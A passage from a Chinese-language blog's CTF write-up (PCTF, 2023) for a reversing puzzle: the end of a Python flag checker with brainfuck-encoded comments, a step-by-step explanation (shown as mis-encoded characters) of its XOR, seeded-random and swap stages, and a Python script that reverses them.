++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.+++++.++.+++++.-.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;---------------.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;----------------.+++++.++.+++++.-.&lt;&lt;.------.&gt;++++++++.&gt;------.++++++.---------------.+++++++++++++.&lt;&lt;--.&gt;+.&gt;------.-----------.++++++.&lt;------------.&lt;.++.+++++++..</span></span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()[<span class="number">0</span>] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++.+.-----------.+++++++++.&lt;&lt;++++++++.-.&gt;&gt;+.++++++.-.----.+++++.-.&lt;&lt;+++++++.&gt;&gt;.++++.----.&lt;&lt;-------.+++++.------------.+++++++.&gt;&gt;--.&lt;&lt;.++.+++++.&gt;&gt;.-------------.----.+++.++++++++.---.+++++.---------.++++++++++++++.&lt;&lt;------.+.&gt;&gt;------------------------.&lt;&lt;+++++++.&gt;&gt;++.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span> == flag: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.---.&lt;&lt;++.&gt;&gt;+++.+++++.++.+++++.-.&lt;&lt;.&gt;---------..&lt;.&gt;&gt;--------------.++++++.-----------.++++++.&lt;---.</span></span><br><span class="line">        print(<span class="string">&quot;What... how?&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++++++.&gt;------------.-------.+++++++++++++++++++.&lt;&lt;++++++++++++...--------------.&gt;&gt;------------.+++++++.++++++++.&lt;------------------------.&lt;++.+++++++.</span></span><br><span class="line">        print(<span class="string">&quot;I guess you broke my &#x27;beautiful&#x27; code :(&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++.&lt;--.&gt;&gt;-------------.++++++++++++++.----------------.++++++++++++++..&lt;&lt;.&gt;&gt;++++++.----------.++++++.&lt;&lt;.&gt;&gt;-------------------.++++++++++++++++.---.----.------.&lt;&lt;.&gt;&gt;++++++++.++++++++++++.&lt;&lt;.+++++++.&gt;&gt;-----------------------.+++.----.++++++++++++++++++++.-.-----------.---.+++++++++++++++.---------.&lt;&lt;.-------.&gt;&gt;---------.++++++++++++.-----------.+.&lt;&lt;.&gt;---------------.&lt;++++++++.------.+++++++.</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+.+++++++.+++++++.--------------.&lt;------------.</span></span><br><span class="line">        print(<span class="string">&quot;haha, nope. Try again!&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;&gt;------------.-------.+++++++.-------.&lt;&lt;++++++++++.------------.&gt;&gt;+++++++++++++.+.+.-----------.&lt;&lt;++++++++++++++.--------------.&gt;++++++++++++++.&gt;+++++++++++++.+++++++.&lt;&lt;.&gt;+++++++++++++.++++++.------.++++++++.+++++.&lt;+.+.+++++++.</span></span><br></pre></td></tr></table></figure>
<p>æ³¨é‡Šæ˜¯æºä»£ç çš„brainfuckç¼–ç ï¼Œæˆ‘ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæºä»£ç æ˜¯å‡çš„ï¼Œbrainfuckè§£ç å‡ºæ¥æ‰æ˜¯çœŸçš„ï¼Œæ²¡æƒ³åˆ°çœŸä¸€æ¨¡ä¸€æ ·ï¼ˆ</p>
<p>ä»£ç çš„æµç¨‹ä¸ºï¼Œflagå…ˆè¿›å…¥entryå‡½æ•°ï¼Œç„¶åå€’åºï¼Œè¿›å…¥stage1</p>
<p>stage1çš„æµç¨‹ä¸ºï¼Œæ¯ä¸ªä½ç½®ä¸Šçš„å­—ç¬¦ä¸å…¶åºå·è¿›è¡Œä¸€æ¬¡å¼‚æˆ–ï¼Œç„¶åä¼ å…¥stage2</p>
<p>stage2çš„æµç¨‹ä¸ºï¼Œæ–°å»ºä¸€ä¸ªç©ºå˜é‡tï¼ˆé‚£ä¸²brainfuckæ˜¯æ··æ·†ä»£ç ï¼Œå…¶å®å°±æ˜¯ç©ºå­—ç¬¦ä¸²ï¼‰ï¼Œç„¶åä¼ å…¥çš„flagæ¯ä¸ªéƒ½è¿›è¡Œäº†ä¸€æ¬¡å‡æ³•ï¼Œæ­¤å¤„éšæœºæ•°ä¸ºä¼ªéšæœºï¼Œå®Œå…¨å¯å¤ç°ï¼Œç„¶åä¼ å…¥finalstage</p>
<p>finalstageçš„æµç¨‹ä¸ºï¼Œå°†flagé€†åºä¸€æ¬¡ï¼Œç„¶åä¸¤ä¸¤ä¸€ç»„å°†flagè°ƒæ¢ä¸€ä¸‹ï¼Œç”±äºflagä¸ºå¥‡æ•°ï¼Œæ•…æœ€åä¸€ä¸ªflagçš„å­—ç¬¦ä¸å˜</p>
<p>å¾ˆç®€å•ï¼Œåªè¦ç…§ç€æµç¨‹é€†åºå³å¯ï¼š</p>
<p><code>resultä¸¤ä¸¤è°ƒæ¢ -&gt; é€†åº -&gt; æŒ‰ç…§éšæœºæ•°åŠ ä¸€ä¸ªå€¼ -&gt; ä¸è‡ªå·±ä½ç½®ä¸Šçš„å­—ç¬¦è¿›è¡Œå¼‚æˆ– -&gt; é€†åº</code></p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()[<span class="number">0</span>] </span><br><span class="line"></span><br><span class="line">    h = <span class="number">0</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> h &lt; <span class="built_in">len</span>(result): </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            flag += result[h+<span class="number">1</span>] + result[h] </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            flag += result[h] </span><br><span class="line">        h += <span class="number">2</span> </span><br><span class="line">    </span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    flag.reverse()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">    seed(<span class="number">10</span>)</span><br><span class="line">    fake_random = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">        fake_random.append(randint(<span class="number">0</span>, <span class="number">5</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fake_random.reverse()</span></span><br><span class="line">    new_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        new_flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + fake_random[i])</span><br><span class="line">    </span><br><span class="line">    print(new_flag)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_flag)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(new_flag[i]) ^ i)</span><br><span class="line">    </span><br><span class="line">    print(flag)</span><br><span class="line">    </span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    flag.reverse()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸ªå‘ç‚¹ï¼Œå°±æ˜¯python2å’Œpython3çš„ç§å­ä¼šæœ‰å·®å¼‚ï¼Œè¦ç”¨python3æ¥è·‘è¿™ä¸ªè„šæœ¬</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2023/09/11/PCTF-wp/">http://example.com/2023/09/11/PCTF-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://example.com">Alex's blog~</a>ï¼</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/write-up/">write up</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/09/16/LJB-2023/"><i class="fa fa-chevron-left">  </i><span>é™‡å‰‘æ¯è¢«è–„çº±ä¹‹æ—…</span></a></div><div class="next-post pull-right"><a href="/2023/07/16/Java-Ser-CC1/"><span>Java-Ser-CC1</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2023 By Alex</div><div class="framework-info"><span>é©±åŠ¨ - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>